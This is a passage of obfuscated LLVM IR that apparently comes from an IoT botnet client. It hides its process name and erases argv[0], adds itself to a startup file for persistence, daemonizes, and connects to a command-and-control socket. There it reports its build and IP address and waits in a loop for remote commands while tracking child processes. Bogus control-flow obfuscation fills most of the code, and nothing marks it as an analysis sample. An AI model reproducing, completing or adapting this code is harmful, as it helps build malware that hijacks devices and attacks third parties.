; <label>:181:                                    ; preds = %178, %originalBBpart2, %29, %15
  %182 = load i32, i32* %1, align 4
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %183, i8** %9, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %184 = load i32, i32* %7, align 4
  %185 = call i32 @close(i32 %184)
  %186 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %187 = load i8, i8* %186, align 16
  %188 = icmp ne i8 %187, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  %189 = load i32, i32* %10, align 4
  %190 = icmp slt i32 %189, 6
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %158
  %191 = load i32, i32* %10, align 4
  %_ = shl i32 %191, 1
  %_15 = sub i32 %191, 1
  %gen = mul i32 %_15, 1
  %_16 = sub i32 %191, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 %191, 1
  %gen19 = mul i32 %_18, 1
  %192 = add nsw i32 %191, 1
  store i32 %192, i32* %10, align 4
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.111
  %4 = load i32, i32* @y.112
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca [256 x i8], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %struct._IO_FILE*, align 8
  %22 = alloca [256 x i8], align 16
  %23 = alloca [1024 x i8], align 16
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %struct._IO_FILE*, align 8
  %27 = alloca [4096 x i8], align 16
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca [1024 x i8], align 16
  %37 = alloca i32, align 4
  %38 = alloca [10 x i8*], align 16
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %14, align 8
  %42 = load i8**, i8*** %13, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = load i8**, i8*** %13, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i64 @strlen(i8* %47) #10
  %49 = call i8* @strncpy(i8* %44, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i64 %48) #2
  %50 = load i8**, i8*** %13, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %51, align 8
  %52 = load i8*, i8** %14, align 8
  %53 = ptrtoint i8* %52 to i64
  %54 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %53, i32 0, i32 0, i32 0)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = call i32 @getpid() #2
  %57 = xor i32 %55, %56
  call void @srand(i32 %57) #2
  %58 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %59 = call i32 @getpid() #2
  %60 = xor i32 %58, %59
  call void @init_rand(i32 %60)
  store i32 0, i32* %18, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i32 0, i32 0), i8** %20, align 8
  %61 = load i8*, i8** %20, align 8
  %62 = call %struct._IO_FILE* @fopen(i8* %61, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %62, %struct._IO_FILE** %21, align 8
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %64 = icmp eq %struct._IO_FILE* %63, null
  %65 = load i32, i32* @x.111
  %66 = load i32, i32* @y.112
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %64, label %73, label %92

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* @x.111
  %75 = load i32, i32* @y.112
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %73
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i32 0, i32 0), i8** %20, align 8
  %82 = load i8*, i8** %20, align 8
  %83 = call %struct._IO_FILE* @fopen(i8* %82, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %83, %struct._IO_FILE** %21, align 8
  %84 = load i32, i32* @x.111
  %85 = load i32, i32* @y.112
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %92

; <label>:92:                                     ; preds = %originalBBpart225, %originalBBpart2
  %93 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %94 = icmp ne %struct._IO_FILE* %93, null
  br i1 %94, label %95, label %252

; <label>:95:                                     ; preds = %92
  %96 = load i8**, i8*** %13, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 0
  %98 = load i8*, i8** %97, align 8
  %99 = call i64 @strlen(i8* %98) #10
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %102 = call i8* @getcwd(i8* %101, i64 256) #2
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #10
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %216

; <label>:106:                                    ; preds = %95
  br label %107

; <label>:107:                                    ; preds = %117, %106
  %108 = load i8**, i8*** %13, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 0
  %110 = load i8*, i8** %109, align 8
  %111 = load i32, i32* %24, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = load i8, i8* %113, align 1
  %115 = sext i8 %114 to i32
  %116 = icmp ne i32 %115, 47
  br i1 %116, label %117, label %120

; <label>:117:                                    ; preds = %107
  %118 = load i32, i32* %24, align 4
  %119 = add nsw i32 %118, -1
  store i32 %119, i32* %24, align 4
  br label %107

; <label>:120:                                    ; preds = %107
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %123 = load i8**, i8*** %13, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 0
  %125 = load i8*, i8** %124, align 8
  %126 = load i32, i32* %24, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = call i32 (i8*, i8*, ...) @sprintf(i8* %121, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.547, i32 0, i32 0), i8* %122, i8* %128) #2
  br label %130

; <label>:130:                                    ; preds = %162, %120
  %131 = load i32, i32* @x.111
  %132 = load i32, i32* @y.112
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %130
  %139 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %140 = call i32 @feof(%struct._IO_FILE* %139) #2
  %141 = icmp ne i32 %140, 0
  %142 = xor i1 %141, true
  %143 = load i32, i32* @x.111
  %144 = load i32, i32* @y.112
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart239, label %originalBB27alteredBB

originalBBpart239:                                ; preds = %originalBB27
  br i1 %142, label %151, label %163

; <label>:151:                                    ; preds = %originalBBpart239
  %152 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %153 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %154 = call i8* @fgets(i8* %152, i32 1024, %struct._IO_FILE* %153)
  %155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %156 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %157 = call i32 @strcasecmp(i8* %155, i8* %156) #10
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %162, label %159

; <label>:159:                                    ; preds = %151
  %160 = load i32, i32* %25, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %25, align 4
  br label %162

; <label>:162:                                    ; preds = %159, %151
  br label %130

; <label>:163:                                    ; preds = %originalBBpart239
  %164 = load i32, i32* @x.111
  %165 = load i32, i32* @y.112
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %163
  %172 = load i32, i32* %25, align 4
  %173 = icmp eq i32 %172, 0
  %174 = load i32, i32* @x.111
  %175 = load i32, i32* @y.112
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %173, label %182, label %196

; <label>:182:                                    ; preds = %originalBBpart243
  %183 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %184 = call i32 @fclose(%struct._IO_FILE* %183)
  %185 = load i8*, i8** %20, align 8
  %186 = call %struct._IO_FILE* @fopen(i8* %185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.548, i32 0, i32 0))
  store %struct._IO_FILE* %186, %struct._IO_FILE** %26, align 8
  %187 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %188 = icmp ne %struct._IO_FILE* %187, null
  br i1 %188, label %189, label %195

; <label>:189:                                    ; preds = %182
  %190 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %191 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %192 = call i32 @fputs(i8* %190, %struct._IO_FILE* %191)
  %193 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %194 = call i32 @fclose(%struct._IO_FILE* %193)
  br label %195

; <label>:195:                                    ; preds = %189, %182
  br label %215

; <label>:196:                                    ; preds = %originalBBpart243
  %197 = load i32, i32* @x.111
  %198 = load i32, i32* @y.112
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %196
  %205 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %206 = call i32 @fclose(%struct._IO_FILE* %205)
  %207 = load i32, i32* @x.111
  %208 = load i32, i32* @y.112
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %215

; <label>:215:                                    ; preds = %originalBBpart247, %195
  br label %235

; <label>:216:                                    ; preds = %95
  %217 = load i32, i32* @x.111
  %218 = load i32, i32* @y.112
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %216
  %225 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %226 = call i32 @fclose(%struct._IO_FILE* %225)
  %227 = load i32, i32* @x.111
  %228 = load i32, i32* @y.112
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %235

; <label>:235:                                    ; preds = %originalBBpart251, %215
  %236 = load i32, i32* @x.111
  %237 = load i32, i32* @y.112
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %235
  %244 = load i32, i32* @x.111
  %245 = load i32, i32* @y.112
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %252

; <label>:252:                                    ; preds = %originalBBpart255, %92
  %253 = call i32 @getOurIP()
  %254 = call i32 @fork() #2
  store i32 %254, i32* %15, align 4
  %255 = icmp ne i32 %254, 0
  br i1 %255, label %256, label %275

; <label>:256:                                    ; preds = %252
  %257 = load i32, i32* @x.111
  %258 = load i32, i32* @y.112
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %256
  %265 = load i32, i32* %15, align 4
  %266 = call i32 @waitpid(i32 %265, i32* %17, i32 0)
  call void @exit(i32 0) #14
  %267 = load i32, i32* @x.111
  %268 = load i32, i32* @y.112
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  unreachable

; <label>:275:                                    ; preds = %252
  %276 = load i32, i32* %15, align 4
  %277 = icmp ne i32 %276, 0
  br i1 %277, label %322, label %278

; <label>:278:                                    ; preds = %275
  %279 = load i32, i32* @x.111
  %280 = load i32, i32* @y.112
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %278
  %287 = call i32 @fork() #2
  store i32 %287, i32* %16, align 4
  %288 = icmp ne i32 %287, 0
  %289 = load i32, i32* @x.111
  %290 = load i32, i32* @y.112
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %288, label %297, label %298

; <label>:297:                                    ; preds = %originalBBpart263
  call void @exit(i32 0) #14
  unreachable

; <label>:298:                                    ; preds = %originalBBpart263
  %299 = load i32, i32* %16, align 4
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %302, label %301

; <label>:301:                                    ; preds = %298
  br label %320

; <label>:302:                                    ; preds = %298
  %303 = load i32, i32* @x.111
  %304 = load i32, i32* @y.112
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %302
  %311 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  %312 = load i32, i32* @x.111
  %313 = load i32, i32* @y.112
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %320

; <label>:320:                                    ; preds = %originalBBpart267, %301
  br label %321

; <label>:321:                                    ; preds = %320
  br label %340

; <label>:322:                                    ; preds = %275
  %323 = load i32, i32* @x.111
  %324 = load i32, i32* @y.112
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %322
  %331 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  %332 = load i32, i32* @x.111
  %333 = load i32, i32* @y.112
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %340

; <label>:340:                                    ; preds = %originalBBpart271, %321
  br label %341

; <label>:341:                                    ; preds = %340
  %342 = call i32 @setsid() #2
  %343 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #2
  %344 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %345

; <label>:345:                                    ; preds = %970, %originalBBpart275, %341
  %346 = call i32 @initConnection()
  %347 = icmp ne i32 %346, 0
  br i1 %347, label %348, label %366

; <label>:348:                                    ; preds = %345
  %349 = load i32, i32* @x.111
  %350 = load i32, i32* @y.112
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %348
  %357 = call i32 @sleep(i32 30)
  %358 = load i32, i32* @x.111
  %359 = load i32, i32* @y.112
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %345

; <label>:366:                                    ; preds = %345
  %367 = load i32, i32* @x.111
  %368 = load i32, i32* @y.112
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %366
  %375 = load i32, i32* @mainCommSock, align 4
  %376 = call i8* @getBuild()
  %377 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %378 = call i8* @inet_ntoa(i32 %377) #2
  %379 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i32 0, i32 0), i8* %376, i8* %378)
  store i32 0, i32* %28, align 4
  store i32 0, i32* %29, align 4
  %380 = load i32, i32* @x.111
  %381 = load i32, i32* @y.112
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %388

; <label>:388:                                    ; preds = %969, %808, %666, %541, %originalBBpart279
  %389 = load i32, i32* @x.111
  %390 = load i32, i32* @y.112
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %388
  %397 = load i32, i32* @mainCommSock, align 4
  %398 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %399 = call i32 @recvLine(i32 %397, i8* %398, i32 4096)
  store i32 %399, i32* %28, align 4
  %400 = icmp ne i32 %399, -1
  %401 = load i32, i32* @x.111
  %402 = load i32, i32* @y.112
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %400, label %409, label %970

; <label>:409:                                    ; preds = %originalBBpart283
  %410 = load i32, i32* @x.111
  %411 = load i32, i32* @y.112
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %409
  store i32 0, i32* %29, align 4
  %418 = load i32, i32* @x.111
  %419 = load i32, i32* @y.112
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %426

; <label>:426:                                    ; preds = %529, %originalBBpart287
  %427 = load i32, i32* %29, align 4
  %428 = sext i32 %427 to i64
  %429 = load i64, i64* @numpids, align 8
  %430 = icmp ult i64 %428, %429
  br i1 %430, label %431, label %532

; <label>:431:                                    ; preds = %426
  %432 = load i32*, i32** @pids, align 8
  %433 = load i32, i32* %29, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds i32, i32* %432, i64 %434
  %436 = load i32, i32* %435, align 4
  %437 = call i32 @waitpid(i32 %436, i32* null, i32 1)
  %438 = icmp sgt i32 %437, 0
  br i1 %438, label %439, label %512

; <label>:439:                                    ; preds = %431
  %440 = load i32, i32* %29, align 4
  %441 = add nsw i32 %440, 1
  store i32 %441, i32* %31, align 4
  br label %442

; <label>:442:                                    ; preds = %originalBBpart2104, %439
  %443 = load i32, i32* %31, align 4
  %444 = zext i32 %443 to i64
  %445 = load i64, i64* @numpids, align 8
  %446 = icmp ult i64 %444, %445
  br i1 %446, label %447, label %477

; <label>:447:                                    ; preds = %442
  %448 = load i32*, i32** @pids, align 8
  %449 = load i32, i32* %31, align 4
  %450 = zext i32 %449 to i64
  %451 = getelementptr inbounds i32, i32* %448, i64 %450
  %452 = load i32, i32* %451, align 4
  %453 = load i32*, i32** @pids, align 8
  %454 = load i32, i32* %31, align 4
  %455 = sub i32 %454, 1
  %456 = zext i32 %455 to i64
  %457 = getelementptr inbounds i32, i32* %453, i64 %456
  store i32 %452, i32* %457, align 4
  br label %458

; <label>:458:                                    ; preds = %447
  %459 = load i32, i32* @x.111
  %460 = load i32, i32* @y.112
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %458
  %467 = load i32, i32* %31, align 4
  %468 = add i32 %467, 1
  store i32 %468, i32* %31, align 4
  %469 = load i32, i32* @x.111
  %470 = load i32, i32* @y.112
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart2104, label %originalBB89alteredBB

originalBBpart2104:                               ; preds = %originalBB89
  br label %442

; <label>:477:                                    ; preds = %442
  %478 = load i32*, i32** @pids, align 8
  %479 = load i32, i32* %31, align 4
  %480 = sub i32 %479, 1
  %481 = zext i32 %480 to i64
  %482 = getelementptr inbounds i32, i32* %478, i64 %481
  store i32 0, i32* %482, align 4
  %483 = load i64, i64* @numpids, align 8
  %484 = add i64 %483, -1
  store i64 %484, i64* @numpids, align 8
  %485 = load i64, i64* @numpids, align 8
  %486 = add i64 %485, 1
  %487 = mul i64 %486, 4
  %488 = call noalias i8* @malloc(i64 %487) #2
  %489 = bitcast i8* %488 to i32*
  store i32* %489, i32** %30, align 8
  store i32 0, i32* %31, align 4
  br label %490

; <label>:490:                                    ; preds = %505, %477
  %491 = load i32, i32* %31, align 4
  %492 = zext i32 %491 to i64
  %493 = load i64, i64* @numpids, align 8
  %494 = icmp ult i64 %492, %493
  br i1 %494, label %495, label %508

; <label>:495:                                    ; preds = %490
  %496 = load i32*, i32** @pids, align 8
  %497 = load i32, i32* %31, align 4
  %498 = zext i32 %497 to i64
  %499 = getelementptr inbounds i32, i32* %496, i64 %498
  %500 = load i32, i32* %499, align 4
  %501 = load i32*, i32** %30, align 8
  %502 = load i32, i32* %31, align 4
  %503 = zext i32 %502 to i64
  %504 = getelementptr inbounds i32, i32* %501, i64 %503
  store i32 %500, i32* %504, align 4
  br label %505

; <label>:505:                                    ; preds = %495
  %506 = load i32, i32* %31, align 4
  %507 = add i32 %506, 1
  store i32 %507, i32* %31, align 4
  br label %490

; <label>:508:                                    ; preds = %490
  %509 = load i32*, i32** @pids, align 8
  %510 = bitcast i32* %509 to i8*
  call void @free(i8* %510) #2
  %511 = load i32*, i32** %30, align 8
  store i32* %511, i32** @pids, align 8
  br label %512

; <label>:512:                                    ; preds = %508, %431
  %513 = load i32, i32* @x.111
  %514 = load i32, i32* @y.112
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %512
  %521 = load i32, i32* @x.111
  %522 = load i32, i32* @y.112
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
